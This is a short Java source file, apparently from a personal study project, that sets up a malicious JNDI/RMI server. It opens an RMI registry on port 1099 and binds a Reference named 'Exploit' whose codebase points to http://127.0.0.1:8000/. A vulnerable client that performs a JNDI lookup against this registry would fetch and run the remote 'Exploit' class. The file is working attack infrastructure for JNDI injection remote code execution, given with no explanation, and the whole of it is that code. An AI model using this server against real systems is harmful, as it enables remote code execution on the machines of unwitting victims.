import com.sun.jndi.rmi.registry.ReferenceWrapper;

import javax.naming.NamingException;
import javax.naming.Reference;
import java.rmi.AlreadyBoundException;
import java.rmi.RemoteException;
import java.rmi.registry.LocateRegistry;
import java.rmi.registry.Registry;

/**
 * @author <a href="http://blog.chenforcode.cn">PKUCoder</a>
 * @date 2022/3/5 6:50 下午
 * @description
 */
public class JNDIServer {
    public static void main(String[] args) throws RemoteException, NamingException, AlreadyBoundException, AlreadyBoundException {
        System.setProperty("com.sun.jndi.rmi.object.trustURLCodebase","true");
        Registry registry = LocateRegistry.createRegistry(1099);
        Reference reference = new Reference("Exploit",
                "Exploit", "http://127.0.0.1:8000/");
        ReferenceWrapper referenceWrapper = new ReferenceWrapper(reference);
        registry.bind("Exploit", referenceWrapper);
    }
}
